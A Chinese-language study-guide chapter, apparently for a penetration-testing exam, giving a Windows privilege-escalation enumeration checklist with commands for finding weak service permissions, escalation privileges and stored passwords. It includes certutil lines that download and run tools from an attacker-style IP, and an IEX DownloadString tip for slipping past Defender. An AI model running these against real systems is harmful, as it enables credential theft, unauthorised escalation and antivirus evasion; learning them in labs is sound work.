# Ch 25 — Windows 提權方法論：環境收集清單

> 目標：建立「拿到低權限 Windows shell 後，系統性地找提權路徑」的思維框架和指令清單。

## Windows 提權的常見路徑

```
SeImpersonatePrivilege → Potato 系列（最高頻）
服務二進位弱權限        → 替換 binary，重啟服務
不安全的服務路徑       → 沒有引號的路徑注入
AlwaysInstallElevated → MSI 安裝 shell
排程任務弱權限         → 替換腳本
DLL Hijacking         → 放惡意 DLL
UAC Bypass            → 繞過 UAC 提到 High Integrity
憑證竊取               → 設定檔、登錄、記憶體
```

## 基本資訊收集

**到 Windows shell 後的前幾個指令：**

```cmd
whoami
whoami /all      ← 最重要！看特權（Privileges）

net user
net user <username>    ← 看你的使用者屬於哪些群組
net localgroup administrators   ← 誰是管理員

systeminfo
ipconfig /all
netstat -ano
```

### whoami /all 解讀

```
USER INFORMATION
User Name   SID
=========== ===========
machine\bob S-1-5-21-...

PRIVILEGES INFORMATION
Privilege Name                Description                    State
============================= ============================== ========
SeImpersonatePrivilege        Impersonate a client...        Enabled   ← 高危！
SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
```

**看到這些就要興奮**：
- `SeImpersonatePrivilege` → Potato 攻擊（Ch 27）
- `SeAssignPrimaryTokenPrivilege` → 類 Potato
- `SeBackupPrivilege` → 可以讀任何檔案（包括 SAM）
- `SeRestorePrivilege` → 可以寫任何檔案
- `SeTakeOwnershipPrivilege` → 取得任何物件所有權

## 系統資訊收集

```cmd
systeminfo
# 看 OS 版本和 Hotfix

# 找沒有 patch 的 hotfix
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

搜尋 exploit：

```bash
# 在 Kali
searchsploit windows 10 privilege escalation
# 或根據具體的 KB 號搜尋缺少的 patch
```

**核心 / OS 漏洞是最後手段**，不穩定，考試謹慎用。

## 服務相關

```cmd
# 列出所有服務
sc query

# 服務設定
sc qc <service_name>

# 檢查服務的 binary 路徑
wmic service get name,pathname,startmode | findstr /i "auto"

# 檢查服務的權限（用 PowerShell）
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<servicename>"
```

## 排程任務

```cmd
schtasks /query /fo LIST /v

# 或 PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Select TaskName, TaskPath
```

## 登錄機碼（Registry）

```cmd
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 儲存的憑證
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

# 自動登入憑證
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## 密碼搜尋

```cmd
# 找可能含有密碼的檔案
dir /s /b *.xml *.ini *.txt *.config 2>nul | findstr /i "pass user admin"

# 在檔案內容裡搜密碼
findstr /si password *.xml *.ini *.txt
findstr /si password C:\Users\*

# 設定檔常見位置
type C:\Windows\Microsoft.NET\Framework64\*\config\web.config 2>nul
type C:\inetpub\wwwroot\web.config 2>nul
```

## 網路資訊

```cmd
netstat -ano
# 找本地監聽服務（127.0.0.1 的）

# 找路由表
route print

# ARP 快取（內網其他主機）
arp -a
```

## 可寫目錄

```cmd
# 找當前使用者可寫的目錄
icacls C:\Windows\System32 2>nul | findstr /i "(F) (M) (W)"
icacls "C:\Program Files" 2>nul | findstr /i "(F) (M) (W)"
```

## PowerShell 更完整的枚舉

```powershell
# 服務二進位路徑（找有弱引號的）
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch '"'} | Select Name, PathName

# 可修改的服務
Get-WmiObject -Class Win32_Service | ForEach-Object {
    $svc = $_
    try {
        $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
        if ($acl.Access | Where-Object {$_.IdentityReference -match $env:USERNAME -and $_.FileSystemRights -match "FullControl|Write"}) {
            $svc | Select Name, PathName
        }
    } catch {}
}
```

## 提權優先順序（Windows）

```
1. SeImpersonatePrivilege → Potato（最快，最常見）
2. Service binary 弱權限 → 替換 binary
3. Unquoted service path → 路徑注入
4. AlwaysInstallElevated → MSI shell
5. Registry / config 密碼 → 密碼重用
6. 排程任務弱權限
7. Kernel exploit（最後）
```

## winPEAS 自動化

```powershell
# 下載 winPEAS（有 .exe 和 .bat 版本）
# .bat 版本不需要編譯，直接跑

# 在靶機下載
certutil -urlcache -f http://10.10.14.5/winPEASany.exe C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe

# 或 bat 版
certutil -urlcache -f http://10.10.14.5/winPEAS.bat C:\Windows\Temp\winpeas.bat
C:\Windows\Temp\winpeas.bat
```

winPEAS 也用顏色標記高危項目，關注紅色部分。

## 常見卡關排錯

| 症狀 | 原因 / 解法 |
|------|-------------|
| 有 shell 但 winPEAS 跑不動 | 可能缺 .NET 或被 AV 砍。改用 PowerUp (`Invoke-AllChecks`)、Seatbelt，或手動跑本章的清單指令 |
| `whoami /priv` 看到一堆權限不知哪個有用 | 鎖定這兩個金礦：**SeImpersonatePrivilege**（→ Potato，Ch 27）、**SeBackupPrivilege**（→ 抄 SAM/SYSTEM）。服務帳號（iis/mssql）幾乎一定有 SeImpersonate |
| 服務路徑有漏洞但改不動 | 分清三種：unquoted service path、可寫的服務執行檔、可改的服務設定（`sc config`）。用 `accesschk.exe`（或 PowerUp）確認你對哪個有寫權限 |
| 上傳工具就被 Defender 砍 | 從記憶體執行（`IEX(New-Object Net.WebClient).DownloadString(...)`）、換未簽名版本、或改用內建 LOLBAS 手法。考試不必追求 bypass，優先找不需落地檔案的路徑 |
| 反彈 shell 是 32-bit 看不到某些路徑 | WOW64 重導向。用 `C:\Windows\Sysnative\` 存取真正的 System32，或換 64-bit payload |
| 找不到任何提權點 | 回頭翻憑證：`C:\` 與使用者目錄的設定檔、`cmdkey /list`、Registry 的 autologon/VNC/PuTTY、`unattend.xml`、PowerShell history (`ConsoleHost_history.txt`)。Windows 提權常靠「撿到的密碼」而非漏洞 |

> **Potato 是高頻考點**：看到 `SeImpersonatePrivilege` 就往 PrintSpoofer / GodPotato 想（Ch 27），這是服務帳號提權到 SYSTEM 最穩的路。

## 本章對應靶機

所有 Part 6 靶機都從這章的收集清單開始：
1. 先跑手動清單（特別是 `whoami /all`）
2. 再跑 winPEAS
3. 根據發現選提權路徑

## 自我檢核

- [ ] 能說出「到 Windows shell 後的前 3 個指令」
- [ ] 能解讀 `whoami /all` 輸出中的特權名稱
- [ ] 知道 `SeImpersonatePrivilege` 意味著什麼（Potato）
- [ ] 知道在 Registry 哪裡找 AlwaysInstallElevated 設定

→ [Ch 26 服務濫用：不安全路徑 + 弱服務權限](./26-service-abuse.md)
